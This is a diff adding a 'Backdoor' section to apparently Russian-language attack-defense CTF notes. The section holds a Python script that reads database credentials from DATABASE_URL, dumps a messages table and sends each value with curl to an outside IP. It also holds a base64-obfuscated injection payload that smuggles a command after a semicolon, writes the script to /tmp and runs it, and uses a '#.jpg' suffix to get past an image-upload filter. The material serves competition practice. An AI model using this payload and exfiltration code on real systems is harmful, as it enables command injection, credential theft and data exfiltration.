@@ -85,3 +85,42 @@ io.recvline()
 
 # **Scout**
 
+
+
+
+# Backdoor
+
+Сам скрипт
+```python
+import psycopg2
+from urllib.parse import urlparse
+import os
+import base64
+
+database_url = os.getenv("DATABASE_URL")
+
+p = urlparse(database_url)
+
+pg_connection_dict = {
+    'dbname': p.path[1:],
+    'user': p.username,
+    'password': p.password,
+    'port': p.port,
+    'host': p.hostname
+}
+print(pg_connection_dict)
+con = psycopg2.connect(**pg_connection_dict)
+cur = con.cursor()
+cur.execute("SELECT text FROM messages;")
+flags = cur.fetchall()
+flags = [x[0] for x in flags]
+print(flags)
+
+for flag in flags:
+	os.popen(f'curl -s "http://172.31.135.145/flag?teamid=t05&flag={flag}"')
+```
+
+Как можно закинуть:
+```python
+; echo 'aW1wb3J0IHBzeWNvcGcyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxwYXJzZQppbXBvcnQgb3MKaW1wb3J0IGJhc2U2NAoKZGF0YWJhc2VfdXJsID0gb3MuZ2V0ZW52KCJEQVRBQkFTRV9VUkwiKQoKcCA9IHVybHBhcnNlKGRhdGFiYXNlX3VybCkKCnBnX2Nvbm5lY3Rpb25fZGljdCA9IHsKICAgICdkYm5hbWUnOiBwLnBhdGhbMTpdLAogICAgJ3VzZXInOiBwLnVzZXJuYW1lLAogICAgJ3Bhc3N3b3JkJzogcC5wYXNzd29yZCwKICAgICdwb3J0JzogcC5wb3J0LAogICAgJ2hvc3QnOiBwLmhvc3RuYW1lCn0KcHJpbnQocGdfY29ubmVjdGlvbl9kaWN0KQoKY29uID0gcHN5Y29wZzIuY29ubmVjdCgqKnBnX2Nvbm5lY3Rpb25fZGljdCkKY3VyID0gY29uLmN1cnNvcigpCmN1ci5leGVjdXRlKCJTRUxFQ1QgdGV4dCBGUk9NIG1lc3NhZ2VzOyIpCmZsYWdzID0gY3VyLmZldGNoYWxsKCkKZmxhZ3MgPSBbeFswXSBmb3IgeCBpbiBmbGFnc10KcHJpbnQoZmxhZ3MpCgpmb3IgZmxhZyBpbiBmbGFnczoKCW9zLnBvcGVuKGYnY3VybCAtcyAiaHR0cDovLzE3Mi4zMS4xMzUuMTQ1L2ZsYWc/dGVhbWlkPXQwNSZmbGFnPXtmbGFnfSInKQo=' | base64 -d > /tmp/volk.py; python3 /tmp/volk.py #.jpg ( #.jpg - Обход загрузки изображений)
+```
